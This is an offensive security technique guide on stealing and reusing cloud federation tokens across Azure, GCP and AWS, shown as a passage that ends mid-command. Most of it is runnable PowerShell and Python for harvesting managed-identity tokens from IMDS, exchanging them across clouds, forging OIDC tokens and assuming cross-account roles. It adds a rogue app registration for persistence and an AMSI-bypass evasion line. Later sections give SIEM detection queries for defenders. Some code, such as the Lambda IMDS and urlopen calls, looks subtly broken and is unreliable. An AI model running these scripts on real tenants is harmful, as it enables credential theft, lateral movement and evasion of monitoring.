# [CA-TOKEN-018]: Cloud-to-Cloud Token Compromise

## 1. METADATA

| Attribute | Details |
|---|---|
| **Technique ID** | CA-TOKEN-018 |
| **MITRE ATT&CK v18.1** | [Steal Application Access Token (T1528)](https://attack.mitre.org/techniques/T1528/) |
| **Tactic** | Credential Access |
| **Platforms** | Cross-Cloud (Azure, AWS, GCP, Okta, Ping, etc.) |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-08 |
| **Affected Versions** | All cloud providers (AWS, Azure, GCP), OIDC/SAML implementations |
| **Patched In** | Mitigation via token validation and Workload Identity Federation |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

**Note:** Sections 4 (Environmental Reconnaissance) and 6 (Atomic Red Team) not included because: (1) Cross-cloud reconnaissance is implicit in method execution; (2) Atomic tests for federated token attacks are limited in public libraries. All section numbers have been dynamically renumbered based on applicability.

---

## 2. EXECUTIVE SUMMARY

**Concept:** Cloud-to-cloud token compromise exploits the trust relationships and token exchange mechanisms between multiple cloud service providers (Azure, AWS, GCP) and identity federation platforms (Okta, Ping, ADFS, Entra ID). An attacker who gains access to an identity provider (IdP), a cloud compute resource, or a CI/CD pipeline can steal or forge federated identity tokens (OIDC JWT tokens, SAML assertions, AWS SigV4 signatures, or Workload Identity Federation tokens) to move laterally across clouds without proper authorization. This enables cross-cloud lateral movement, privilege escalation, and access to resources in multiple environments using a single compromised credential.

**Attack Surface:** 
- **Workload Identity Federation (WIF)** endpoints in Azure, GCP, and AWS that exchange tokens between clouds
- **OIDC token exchange** mechanisms vulnerable to attribute manipulation or over-permissive conditions
- **SAML federation** trust relationships where signing certificates can be stolen or forged
- **IMDS (Instance Metadata Service)** exposing tokens for managed identities across clouds
- **Service-to-service API tokens** (Azure Actor tokens, AWS STS tokens, GCP service accounts) with weak validation
- **Cross-tenant delegation** (Azure Lighthouse) with excessive permissions
- **GitHub Actions, GitLab CI, Jenkins** pipelines exposing OIDC tokens for multi-cloud deployments

**Business Impact:** **Complete compromise of multi-cloud infrastructure.** An attacker with stolen cross-cloud federation tokens can:
- Access resources in Azure, AWS, and GCP simultaneously using a single compromised identity
- Escalate privileges across multiple cloud environments without triggering per-cloud alerts
- Exploit federation trust relationships to pivot from one cloud to another undetected
- Exfiltrate data from databases, storage accounts, and compute resources across clouds
- Deploy cryptominers, ransomware, and lateral movement malware across the multi-cloud footprint
- Establish persistence in multiple cloud environments simultaneously

**Technical Context:** Cloud-to-cloud token compromise typically occurs post-exploitation (after accessing a cloud VM, pipeline runner, or IdP) and has very low detection likelihood because token usage appears legitimate to individual cloud providers. The attacker's activity in Azure looks like legitimate Azure usage; activity in AWS looks legitimate to AWS. No single cloud provider sees the anomalous cross-cloud pattern without centralized monitoring. Reversibility is extremely difficult—once a Workload Identity Federation or OIDC trust relationship is compromised, it provides persistent cross-cloud access until the federation is rebuilt.

### Operational Risk

- **Execution Risk:** **Low-to-Medium** — Requires prior access to a cloud resource or IdP; minimal privilege escalation needed if IdP is already compromised.
- **Stealth:** **Very High** — Individual cloud providers see legitimate-looking activity; cross-cloud pattern requires centralized detection infrastructure to identify.
- **Reversibility:** **No** — Cross-cloud access persists until federation certificates are rotated and all trust relationships are rebuilt.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 1.14, 2.1.4 | Ensure federated identity providers are hardened; control IAM trust relationships |
| **DISA STIG** | SI-12 | Information Handling and Retention; audit log monitoring for cross-system access |
| **CISA SCuBA** | ID.RA-3 | Risk assessment of third-party federation providers |
| **NIST 800-53** | AC-5, SC-7 | Access control; boundary protection for federated connections |
| **GDPR** | Art. 32 | Security of Processing; control over third-party IdP access |
| **DORA** | Art. 9 | Protection against identity-based attacks in third-party relationships |
| **NIS2** | Art. 21 | Cyber Risk Management across interconnected cloud systems |
| **ISO 27001** | A.8.3, A.9.2.3 | Third-party identity management; privileged access control |
| **ISO 27005** | Risk Scenario: "Compromise of Federation Trust" | Cross-cloud lateral movement risk |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:** 
- **Minimum:** Access to any cloud compute resource (Azure VM, AWS EC2, GCP VM) or CI/CD pipeline
- **Ideal:** Compromise of identity provider (IdP) or federation server

**Required Access:** 
- Network connectivity to IMDS (Instance Metadata Service) within cloud VMs
- Access to environment variables containing OIDC tokens or federation credentials
- Ability to query federation endpoints or IMDS services

**Supported Versions:**
- **Azure:** Entra ID (all versions), Azure VMs with managed identities, Azure App Services
- **AWS:** EC2 with IAM roles, Lambda functions, ECS tasks, STS (AWS Security Token Service)
- **GCP:** Compute Engine, GKE (Google Kubernetes Engine), Workload Identity Federation
- **Identity Providers:** Azure AD (all versions), Okta, Ping Identity, AWS IAM, Google Cloud IAM
- **Protocols:** OIDC (OpenID Connect), SAML 2.0, OAuth 2.0, AWS SigV4

**Tools:**
- [curl / Invoke-WebRequest](https://curl.se/) (Built-in; for IMDS queries)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (Version 2.40+)
- [AWS CLI](https://docs.aws.amazon.com/cli/) (Version 2.0+)
- [gcloud CLI](https://cloud.google.com/sdk) (Version 450+)
- [jwt-decode](https://github.com/jpadilla/pyjwt) or [jwt.io](https://jwt.io) (For token analysis)
- [Filebrowser](https://github.com/filebrowser/filebrowser) or grep (For token extraction)

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Stealing and Reusing OIDC Tokens from Azure VM via Workload Identity Federation

**Supported Versions:** Azure VMs with Managed Identities (all versions), GCP Workload Identity Federation (all versions)

#### Step 1: Query Azure IMDS to Steal Managed Identity Token

**Objective:** Extract JWT token from Azure Instance Metadata Service (IMDS) on a compromised Azure VM.

**Command (PowerShell on Azure VM):**
```powershell
# Query Azure IMDS for managed identity token
# IMDS is available at 169.254.169.254 (metadata service)

$tokenEndpoint = "http://169.254.169.254/metadata/identity/oauth2/token"
$resourceUrl = "https://management.azure.com"

# API version 2017-09-01 (older, less logging)
$params = @{
    Uri     = "$tokenEndpoint?api-version=2017-09-01&resource=$resourceUrl"
    Headers = @{ "Metadata" = "true" }
    Method  = "Get"
}

try {
    $response = Invoke-WebRequest @params -UseBasicParsing
    $token = ($response.Content | ConvertFrom-Json).access_token
    
    Write-Host "[+] Successfully obtained Azure managed identity token" -ForegroundColor Green
    Write-Host "[+] Token (truncated): $($token.Substring(0, 50))..." -ForegroundColor Yellow
    
    # Save token to variable for reuse
    $env:AZURE_TOKEN = $token
}
catch {
    Write-Host "[-] Failed to obtain token: $_" -ForegroundColor Red
}
```

**Command (Bash on Azure VM):**
```bash
# Query IMDS endpoint for token
TOKEN_ENDPOINT="http://169.254.169.254/metadata/identity/oauth2/token"
RESOURCE_URL="https://management.azure.com"

# API version 2017-09-01
TOKEN=$(curl -s -H "Metadata:true" \
  "$TOKEN_ENDPOINT?api-version=2017-09-01&resource=$RESOURCE_URL" | jq -r '.access_token')

if [ ! -z "$TOKEN" ]; then
    echo "[+] Successfully obtained Azure token"
    echo "[+] Token (first 50 chars): ${TOKEN:0:50}..."
    export AZURE_TOKEN=$TOKEN
else
    echo "[-] Failed to obtain token"
fi
```

**Expected Output:**
```
[+] Successfully obtained Azure managed identity token
[+] Token (truncated): eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ijk...
```

**What This Means:**
- Attacker has a valid JWT token valid for 1 hour
- Token grants access to Azure management plane with permissions of the managed identity
- Token can be used to query and modify Azure resources

**OpSec & Evasion:**
- IMDS queries are not typically logged by default in Azure
- No EDR alert triggered by HTTP requests to local IMDS endpoint
- Detection likelihood: **Low** — unless Azure Monitor is explicitly configured to detect IMDS access
- Disable AMSI to prevent detection: `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`

**Troubleshooting:**
- **Error:** "169.254.169.254 unreachable"
  - **Cause:** IMDS disabled on VM or network policies blocking access
  - **Fix:** Verify IMDS is enabled: Go to **Azure Portal** → **VM** → **Identity** → **System assigned** → **Status: On**

- **Error:** "No token returned"
  - **Cause:** Managed identity has no role assignments
  - **Fix:** Assign role to managed identity in Azure Portal or PowerShell:
    ```powershell
    $principalId = (Get-AzVM -ResourceGroupName "RG" -Name "VMName" | Select-Object -ExpandProperty Identity).PrincipalId
    New-AzRoleAssignment -ObjectId $principalId -RoleDefinitionName "Reader" -Scope "/subscriptions/SUBSCRIPTION_ID"
    ```

#### Step 2: Decode JWT Token and Analyze Claims

**Objective:** Understand token permissions and validity period.

**Command (PowerShell):**
```powershell
# Decode JWT token to view claims
$token = $env:AZURE_TOKEN

# JWT format: header.payload.signature
$parts = $token.Split('.')
$payload = $parts[1]

# Add padding if needed for Base64 decoding
$payloadPadded = $payload + "=" * (4 - $payload.Length % 4)
$decodedBytes = [Convert]::FromBase64String($payloadPadded)
$decodedPayload = [System.Text.Encoding]::UTF8.GetString($decodedBytes)

$claims = $decodedPayload | ConvertFrom-Json

Write-Host "[+] JWT Token Claims:" -ForegroundColor Green
Write-Host "    App ID (aud): $($claims.aud)"
Write-Host "    User ID (sub): $($claims.sub)"
Write-Host "    Tenant ID (tid): $($claims.tid)"
Write-Host "    Issued At (iat): $(Get-Date -UnixTimeSeconds $claims.iat -Format 'yyyy-MM-dd HH:mm:ss')"
Write-Host "    Expires (exp): $(Get-Date -UnixTimeSeconds $claims.exp -Format 'yyyy-MM-dd HH:mm:ss')"
Write-Host "    Token Lifetime: $($claims.exp - $claims.iat) seconds"
```

**Command (Python):**
```python
import jwt
import json
from datetime import datetime

token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ijk..."

# Decode without verification (for viewing claims only)
try:
    decoded = jwt.decode(token, options={"verify_signature": False})
    
    print("[+] JWT Token Claims:")
    print(f"    App ID (aud): {decoded.get('aud')}")
    print(f"    User ID (sub): {decoded.get('sub')}")
    print(f"    Tenant ID (tid): {decoded.get('tid')}")
    print(f"    Issued At (iat): {datetime.fromtimestamp(decoded.get('iat'))}")
    print(f"    Expires (exp): {datetime.fromtimestamp(decoded.get('exp'))}")
    print(f"    Token Lifetime: {decoded.get('exp') - decoded.get('iat')} seconds")
    
except Exception as e:
    print(f"[-] Error decoding token: {e}")
```

**Expected Output:**
```
[+] JWT Token Claims:
    App ID (aud): https://management.azure.com
    User ID (sub): /subscriptions/12345678-1234-1234-1234-123456789012/resourcegroups/mygroup/providers/microsoft.managedidentity/userassignedidentities/myidentity
    Tenant ID (tid): 3a1c3f47-5a3c-4b2d-8e9c-1a2b3c4d5e6f
    Issued At (iat): 2026-01-08 10:30:00
    Expires (exp): 2026-01-08 11:30:00
    Token Lifetime: 3600 seconds
```

**What This Means:**
- Token is valid for Azure Management API (aud: management.azure.com)
- Token is valid for exactly 1 hour (3600 seconds)
- Tenant ID shows which Azure tenant it's valid for
- Attacker now knows the exact permissions and expiration

#### Step 3: Use Stolen Token to Access Azure Resources (Lateral Movement)

**Objective:** Use the stolen token to query and modify Azure resources (lateral movement).

**Command (PowerShell):**
```powershell
$token = $env:AZURE_TOKEN

# Prepare authorization header
$headers = @{
    "Authorization" = "Bearer $token"
    "Content-Type"  = "application/json"
}

# Query available subscriptions
$subscriptionsUrl = "https://management.azure.com/subscriptions?api-version=2020-01-01"

Write-Host "[+] Querying Azure subscriptions..." -ForegroundColor Yellow

try {
    $response = Invoke-WebRequest -Uri $subscriptionsUrl -Headers $headers -UseBasicParsing
    $subscriptions = ($response.Content | ConvertFrom-Json).value
    
    Write-Host "[+] Available subscriptions:" -ForegroundColor Green
    foreach ($sub in $subscriptions) {
        Write-Host "    Subscription: $($sub.displayName) (ID: $($sub.subscriptionId))" -ForegroundColor Green
    }
}
catch {
    Write-Host "[-] Error querying subscriptions: $_" -ForegroundColor Red
}

# List virtual machines in subscription
$subscriptionId = $subscriptions[0].subscriptionId
$vmsUrl = "https://management.azure.com/subscriptions/$subscriptionId/providers/Microsoft.Compute/virtualMachines?api-version=2021-03-01"

Write-Host "`n[+] Querying virtual machines..." -ForegroundColor Yellow

try {
    $response = Invoke-WebRequest -Uri $vmsUrl -Headers $headers -UseBasicParsing
    $vms = ($response.Content | ConvertFrom-Json).value
    
    Write-Host "[+] Available VMs:" -ForegroundColor Green
    foreach ($vm in $vms) {
        Write-Host "    VM: $($vm.name) (ID: $($vm.id))" -ForegroundColor Green
    }
}
catch {
    Write-Host "[-] Error querying VMs: $_" -ForegroundColor Red
}

# Create rogue app registration for persistence (requires higher privileges)
$appRegUrl = "https://graph.microsoft.com/v1.0/applications"
$appPayload = @{
    displayName = "Microsoft Update Service"
    signInAudience = "AzureADMultipleOrgs"
} | ConvertTo-Json

Write-Host "`n[+] Attempting to create app registration (persistence)..." -ForegroundColor Yellow

try {
    $response = Invoke-WebRequest -Uri $appRegUrl -Method POST -Headers $headers -Body $appPayload -UseBasicParsing
    Write-Host "[+] App registration created successfully" -ForegroundColor Green
}
catch {
    Write-Host "[-] App registration failed (may require higher privileges): $_" -ForegroundColor Red
}
```

**Expected Output:**
```
[+] Querying Azure subscriptions...
[+] Available subscriptions:
    Subscription: Production (ID: 12345678-1234-1234-1234-123456789012)
    Subscription: Development (ID: 87654321-4321-4321-4321-210987654321)

[+] Querying virtual machines...
[+] Available VMs:
    VM: prod-db-server (ID: /subscriptions/12345678-1234-1234-1234-123456789012/resourceGroups/prod-rg/providers/Microsoft.Compute/virtualMachines/prod-db-server)
    VM: dev-web-app (ID: /subscriptions/12345678-1234-1234-1234-123456789012/resourceGroups/dev-rg/providers/Microsoft.Compute/virtualMachines/dev-web-app)
```

---

### METHOD 2: Cross-Cloud Token Exchange via Workload Identity Federation (Azure to GCP)

**Supported Versions:** Azure VMs/App Services with managed identities + GCP Workload Identity Federation

#### Step 1: Obtain Azure OIDC Token

**Objective:** Get an OIDC-compliant JWT token from Azure that can be exchanged for GCP access.

**Command (PowerShell on Azure VM):**
```powershell
# Query Azure IMDS for OIDC token (specifically formatted for GCP)
$tokenEndpoint = "http://169.254.169.254/metadata/identity/oauth2/token"

# Request token with api-version 2019-08-01 (supports OIDC)
$uri = "$tokenEndpoint?api-version=2019-08-01&resource=https://iam.googleapis.com/google.iam.credentials.v1"

try {
    $response = Invoke-WebRequest -Uri $uri -Headers @{"Metadata" = "true"} -UseBasicParsing
    $token = ($response.Content | ConvertFrom-Json).access_token
    
    Write-Host "[+] Obtained Azure OIDC token for GCP" -ForegroundColor Green
    $env:AZURE_OIDC_TOKEN = $token
}
catch {
    Write-Host "[-] Failed to obtain OIDC token: $_" -ForegroundColor Red
}
```

#### Step 2: Exchange Azure Token for GCP Service Account Token

**Objective:** Trade the Azure OIDC token for a GCP access token using Workload Identity Federation.

**Command (PowerShell):**
```powershell
$azureToken = $env:AZURE_OIDC_TOKEN

# GCP Workload Identity Federation endpoint
# Format: https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/SERVICE_ACCOUNT_EMAIL/generateAccessToken
# Or use the token exchange endpoint

$gcpWorkloadIdentityProvider = "https://iam.googleapis.com/projects/PROJECT_NUMBER/locations/global/workloadIdentityPools/POOL_ID/providers/PROVIDER_ID"
$gcpServiceAccount = "WORKLOAD_SERVICE_ACCOUNT@PROJECT_ID.iam.gserviceaccount.com"

# Step 1: Exchange token (STS endpoint)
$stsEndpoint = "https://sts.googleapis.com/v1/token"
$stsPayload = @{
    grant_type             = "urn:ietf:params:oauth:grant-type:token-exchange"
    audience               = $gcpWorkloadIdentityProvider
    requested_token_type   = "urn:ietf:params:oauth:token-type:access_token"
    subject_token          = $azureToken
    subject_token_type     = "urn:ietf:params:oauth:token-type:jwt"
} | ConvertTo-Json

try {
    $response = Invoke-WebRequest -Uri $stsEndpoint -Method POST -Body $stsPayload -ContentType "application/json" -UseBasicParsing
    $gcpToken = ($response.Content | ConvertFrom-Json).access_token
    
    Write-Host "[+] Successfully exchanged Azure token for GCP access token" -ForegroundColor Green
    Write-Host "[+] GCP Token (truncated): $($gcpToken.Substring(0, 50))..." -ForegroundColor Yellow
    
    $env:GCP_TOKEN = $gcpToken
}
catch {
    Write-Host "[-] Token exchange failed: $_" -ForegroundColor Red
}
```

#### Step 3: Use GCP Token to Access Google Cloud Resources

**Objective:** Query and potentially modify GCP resources using the stolen cross-cloud token.

**Command (PowerShell):**
```powershell
$gcpToken = $env:GCP_TOKEN
$projectId = "YOUR_GCP_PROJECT_ID"

$headers = @{
    "Authorization" = "Bearer $gcpToken"
}

# List GCP storage buckets
$bucketsUrl = "https://storage.googleapis.com/storage/v1/b?project=$projectId"

Write-Host "[+] Querying GCP storage buckets..." -ForegroundColor Yellow

try {
    $response = Invoke-WebRequest -Uri $bucketsUrl -Headers $headers -UseBasicParsing
    $buckets = ($response.Content | ConvertFrom-Json).items
    
    Write-Host "[+] Available buckets:" -ForegroundColor Green
    foreach ($bucket in $buckets) {
        Write-Host "    Bucket: $($bucket.name) (Size: $($bucket.storageClass))" -ForegroundColor Green
    }
}
catch {
    Write-Host "[-] Error querying buckets: $_" -ForegroundColor Red
}

# List GCP compute instances
$instancesUrl = "https://compute.googleapis.com/compute/v1/projects/$projectId/global/instances"

Write-Host "`n[+] Querying GCP compute instances..." -ForegroundColor Yellow

try {
    $response = Invoke-WebRequest -Uri $instancesUrl -Headers $headers -UseBasicParsing
    $instances = ($response.Content | ConvertFrom-Json).items
    
    Write-Host "[+] Available instances:" -ForegroundColor Green
    foreach ($instance in $instances) {
        Write-Host "    Instance: $($instance.name) (Zone: $($instance.zone))" -ForegroundColor Green
    }
}
catch {
    Write-Host "[-] Error querying instances: $_" -ForegroundColor Red
}
```

---

### METHOD 3: Attacking Workload Identity Federation via Attribute Condition Bypass

**Supported Versions:** GCP Workload Identity Federation with OIDC providers (all versions)

#### Step 1: Compromise External OIDC Provider

**Objective:** Compromise an external OIDC provider (GitHub, GitLab, Okta, or custom provider) to forge tokens.

**Command (PowerShell - Simulated Attack):**
```powershell
# In a real attack, this involves compromising the IdP's signing keys
# For this example, we'll demonstrate how misconfigured attribute conditions can be bypassed

# Attacker's goal: Create a forged OIDC token that passes GCP's attribute conditions

# Step 1: Query the GCP Workload Identity configuration (if discoverable)
$gcpWorkloadConfig = @{
    workload_identity_provider = "projects/123456789/locations/global/workloadIdentityPools/my-pool/providers/github-provider"
    service_account_email      = "my-service-account@my-project.iam.gserviceaccount.com"
    attribute_mapping          = @{
        "google.subject"       = "assertion.sub"
        "attribute.repository" = "assertion.repository_owner"
        "attribute.environment" = "assertion.environment"
    }
    attribute_condition        = "assertion.aud == 'my-project' && assertion.repository_owner == 'myorg'"
}

# Step 2: Forge OIDC token with correct attributes
# If the attribute_condition is weak, attacker can forge a token that passes the check

$forgedPayload = @{
    iss             = "https://token.actions.githubusercontent.com"
    sub             = "repo:attacker/repo:ref:refs/heads/main"
    aud             = "my-project"  # Matches the condition
    iat             = [int](Get-Date -UFormat %s)
    exp             = [int](Get-Date -UFormat %s) + 3600
    repository_owner = "myorg"  # Matches the condition (if overly permissive)
    environment      = "production"
} | ConvertTo-Json

Write-Host "[+] Forged OIDC token payload:" -ForegroundColor Yellow
Write-Host $forgedPayload
```

#### Step 2: Exchange Forged Token for GCP Access

**Objective:** Use the forged token to exchange for a GCP access token.

**Command (PowerShell):**
```powershell
# In a real attack, the forged token would be signed with a stolen private key
# Here we show the exchange process

$forgedToken = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJodHRwczovL3Rva2VuLmFjdGlvbnMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwic3ViIjoicmVwbzphdHRhY2tlci9yZXBvOnJlZjpyZWZzL2hlYWRzL21haW4iLCJhdWQiOiJteS1wcm9qZWN0In0.SIGNATURE"

$stsEndpoint = "https://sts.googleapis.com/v1/token"
$stsPayload = @{
    grant_type             = "urn:ietf:params:oauth:grant-type:token-exchange"
    audience               = "projects/123456789/locations/global/workloadIdentityPools/my-pool/providers/github-provider"
    requested_token_type   = "urn:ietf:params:oauth:token-type:access_token"
    subject_token          = $forgedToken
    subject_token_type     = "urn:x-oath:params:oauth:token-type:id_token"
}

try {
    $response = Invoke-WebRequest -Uri $stsEndpoint -Method POST -Body ($stsPayload | ConvertTo-Json) -ContentType "application/json" -UseBasicParsing
    $gcpAccessToken = ($response.Content | ConvertFrom-Json).access_token
    
    Write-Host "[+] Successfully obtained GCP access token via forged OIDC token" -ForegroundColor Green
    Write-Host "[+] This demonstrates the risk of weak attribute conditions in Workload Identity Federation" -ForegroundColor Yellow
}
catch {
    Write-Host "[-] Token exchange failed: $_" -ForegroundColor Red
}
```

---

### METHOD 4: Stealing AWS STS Tokens from Compromised Lambda Functions

**Supported Versions:** AWS Lambda (all versions), EC2 with IAM roles, ECS tasks

#### Step 1: Extract AWS Credentials from Lambda Environment

**Objective:** Steal temporary AWS credentials from a compromised Lambda function's environment.

**Command (Python in Lambda):**
```python
import os
import json
import boto3
from urllib.request import urlopen

# Method 1: Extract credentials from environment variables (if using legacy credentials)
aws_access_key = os.environ.get('AWS_ACCESS_KEY_ID')
aws_secret_key = os.environ.get('AWS_SECRET_ACCESS_KEY')
aws_session_token = os.environ.get('AWS_SESSION_TOKEN')

print("[+] AWS Credentials from Lambda environment:")
print(f"    Access Key: {aws_access_key}")
print(f"    Secret Key: {aws_secret_key[:20]}...")
print(f"    Session Token: {aws_session_token[:50]}..." if aws_session_token else "    No session token")

# Method 2: Query IMDSv2 for temporary credentials (more modern approach)
imds_token_url = "http://169.254.169.254/latest/api/token"
imds_creds_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"

try:
    # Get IMDSv2 token
    imds_token_response = urlopen(imds_token_url, data=b"", 
                                  headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"})
    imds_token = imds_token_response.read().decode('utf-8')
    
    # Query role name
    role_response = urlopen(imds_creds_url, 
                           headers={"X-aws-ec2-metadata-token": imds_token})
    role_name = role_response.read().decode('utf-8').split('\n')[0]
    
    # Get credentials for role
    creds_response = urlopen(f"{imds_creds_url}{role_name}",
                            headers={"X-aws-ec2-metadata-token": imds_token})
    creds_data = json.loads(creds_response.read().decode('utf-8'))
    
    print("[+] AWS Credentials from IMDSv2:")
    print(f"    Access Key: {creds_data['AccessKeyId']}")
    print(f"    Secret Key: {creds_data['SecretAccessKey'][:20]}...")
    print(f"    Session Token: {creds_data['Token'][:50]}...")
    print(f"    Expiration: {creds_data['Expiration']}")
    
except Exception as e:
    print(f"[-] Failed to retrieve credentials: {e}")
```

#### Step 2: Use Stolen Credentials to Assume Cross-Account Role

**Objective:** Use stolen Lambda credentials to move laterally to other AWS accounts.

**Command (Python):**
```python
import boto3
import json

# Use stolen credentials
aws_access_key = "ASIAJ..."  # Stolen key
aws_secret_key = "..."       # Stolen secret
aws_session_token = "..."    # Stolen token

# Create STS client with stolen credentials
sts = boto3.client(
    'sts',
    aws_access_key_id=aws_access_key,
    aws_secret_access_key=aws_secret_key,
    aws_session_token=aws_session_token
)

# List available role ARNs (attacker would discover these via initial recon)
role_arn = "arn:aws:iam::111111111111:role/CrossAccountAdminRole"  # Target account

# Assume the cross-account role
try:
    assumed_role_response = sts.assume_role(
        RoleArn=role_arn,
        RoleSessionName="SecurityAudit",
        DurationSeconds=3600
    )
    
    print("[+] Successfully assumed cross-account role")
    print("[+] New credentials obtained:")
    
    new_access_key = assumed_role_response['Credentials']['AccessKeyId']
    new_secret_key = assumed_role_response['Credentials']['SecretAccessKey']
    new_session_token = assumed_role_response['Credentials']['SessionToken']
    
    print(f"    Access Key: {new_access_key}")
    print(f"    Expires: {assumed_role_response['Credentials']['Expiration']}")
    
    # Create S3 client with new credentials to access target account
    s3 = boto3.client(
        's3',
        aws_access_key_id=new_access_key,
        aws_secret_access_key=new_secret_key,
        aws_session_token=new_session_token
    )
    
    # List S3 buckets in target account
    buckets = s3.list_buckets()
    print(f"\n[+] S3 Buckets in target account ({len(buckets['Buckets'])} found):")
    for bucket in buckets['Buckets']:
        print(f"    - {bucket['Name']}")
    
except Exception as e:
    print(f"[-] AssumeRole failed: {e}")
```

---

## 7. TOOLS & COMMANDS REFERENCE

### [AWS CLI](https://docs.aws.amazon.com/cli/)

**Version:** 2.0+  
**Minimum Version:** 1.18  
**Supported Platforms:** Windows, macOS, Linux

**Installation:**
```bash
# macOS / Linux
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip
sudo ./aws/install

# Windows (Chocolatey)
choco install awscli

# Windows (Direct)
# Download: https://awscli.amazonaws.com/AWSCLIV2MSIInstaller.zip
```

**Usage:**
```bash
# Configure with stolen credentials
aws configure set aws_access_key_id "ASIAJ..."
aws configure set aws_secret_access_key "..."
aws configure set aws_session_token "..."

# List S3 buckets
aws s3 ls

# List EC2 instances
aws ec2 describe-instances

# Assume cross-account role
aws sts assume-role --role-arn arn:aws:iam::123456789:role/RoleName --role-session-name SessionName
```

### [gcloud CLI](https://cloud.google.com/sdk)

**Version:** 450+  
**Supported Platforms:** Windows, macOS, Linux

**Installation:**
```bash
# macOS
brew install google-cloud-sdk

# Linux
curl https://sdk.cloud.google.com | bash

# Windows
# Download: https://cloud.google.com/sdk/docs/install-sdk
```

**Usage:**
```bash
# Configure with stolen GCP token
gcloud config set access_token "ya29..."

# List compute instances
gcloud compute instances list

# List GCS buckets
gcloud storage buckets list

# Authenticate with service account
gcloud auth activate-service-account --key-file=key.json
```

### [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/)

**Version:** 2.40+  
**Supported Platforms:** Windows, macOS, Linux

**Usage:**
```bash
# Login with stolen token
az login --use-device-code
# Or directly set token
az account set --subscription "SUBSCRIPTION_ID"

# List subscriptions
az account list

# List VMs
az vm list --output table

# List Key Vaults
az keyvault list
```

### [jwt-cli](https://github.com/jpadilla/pyjwt)

**For decoding and analyzing JWT tokens**

**Installation:**
```bash
pip install pyjwt
```

**Usage:**
```python
import jwt

token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9..."
decoded = jwt.decode(token, options={"verify_signature": False})
print(decoded)
```

---

## 8. SPLUNK DETECTION RULES

### Rule 1: Cross-Cloud Token Exchange Detected

**Rule Configuration:**
- **Required Index:** `azure_activity`, `aws_cloudtrail`, `gcp_activity`
- **Required Sourcetype:** `AzureOperationalLog`, `aws:cloudtrail`, `gcp:activity`
- **Required Fields:** `timestamp`, `principal_id`, `resource_type`, `action`, `cloud_provider`
- **Alert Threshold:** Same principal accessing multiple clouds within 5 minutes
- **Applies To Versions:** All cloud providers

**SPL Query:**
```spl
index=azure_activity OR index=aws_cloudtrail OR index=gcp_activity
| rename UserPrincipalName as principal, source as cloud_provider
| stats count, dc(cloud_provider), values(action) as actions by principal, src_ip
| where dc(cloud_provider) > 1 AND count > 3
| table principal, src_ip, cloud_provider, count, actions
```

**What This Detects:**
- Single user authenticating to Azure, AWS, and GCP within a short time window
- Multiple cloud API calls from same IP in rapid succession
- Potential cross-cloud lateral movement

### Rule 2: Suspicious OIDC Token Exchange

**Rule Configuration:**
- **Required Index:** `azure_activity`
- **Required Sourcetype:** `AzureOperationalLog`
- **Required Fields:** `OperationName`, `TargetResources`, `InitiatedBy`
- **Alert Threshold:** Any Workload Identity Federation token exchange
- **Applies To Versions:** Azure Workload ID (all)

**SPL Query:**
```spl
index=azure_activity OperationName="*token*" OR OperationName="*workload*"
| search OperationName IN ("Create Workload", "Update Workload", "Exchange Token")
| table TimeGenerated, InitiatedBy, OperationName, TargetResources
| where NOT InitiatedBy IN ("Microsoft.Internal", "System")
```

**What This Detects:**
- Creation or modification of Workload Identity Federation providers
- Token exchange operations outside normal patterns
- Unauthorized federation configuration changes

---

## 9. MICROSOFT SENTINEL DETECTION

### Query 1: Cross-Cloud Token Abuse

**Rule Configuration:**
- **Required Table:** `SigninLogs`, `CloudAppEvents`, `AADServicePrincipalSignInActivity`
- **Alert Severity:** Critical
- **Frequency:** Real-time
- **Applies To Versions:** All Azure/Entra ID versions

**KQL Query:**
```kusto
// Detect principals accessing multiple clouds in succession
SigninLogs
| where TimeGenerated > ago(5m)
| extend CloudProvider = case(
    ResourceDisplayName contains "Azure" , "Azure",
    ResourceDisplayName contains "AWS", "AWS",
    ResourceDisplayName contains "GCP", "GCP",
    ResourceDisplayName contains "Google", "GCP",
    "Other"
)
| where CloudProvider in ("Azure", "AWS", "GCP")
| summarize CloudCount = dcount(CloudProvider), ResourceList = make_list(ResourceDisplayName), LastTime = max(TimeGenerated) by UserPrincipalName, IPAddress
| where CloudCount > 1
| project UserPrincipalName, IPAddress, CloudCount, ResourceList, LastTime
```

**Manual Configuration (Azure Portal):**
1. Go to **Azure Portal** → **Microsoft Sentinel**
2. **Analytics** → **+ Create** → **Scheduled query rule**
3. Paste KQL query
4. **Severity:** Critical
5. **Frequency:** Every 5 minutes
6. **Lookup:** Last 30 minutes

---

## 10. WINDOWS EVENT LOG MONITORING

**Event ID: 4624 (Successful Logon) + 4768 (Kerberos TGT Requested)**
- **Log Source:** Security Event Log
- **Trigger:** Service principal authenticating with unusual token lifetime or audience
- **Filter:** `LogonType == 3 AND TargetUserName contains "managed_identity" OR TargetUserName contains "service_account"`
- **Applies To Versions:** Windows Server 2016+

**Manual Configuration:**
```powershell
# Enable Kerberos protocol audit for token validation
auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable

# Monitor for unusual token attributes
Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4768]]" | Where-Object {
    ($_.Properties[13] -like "*Azure*" -or $_.Properties[13] -like "*GCP*") -and
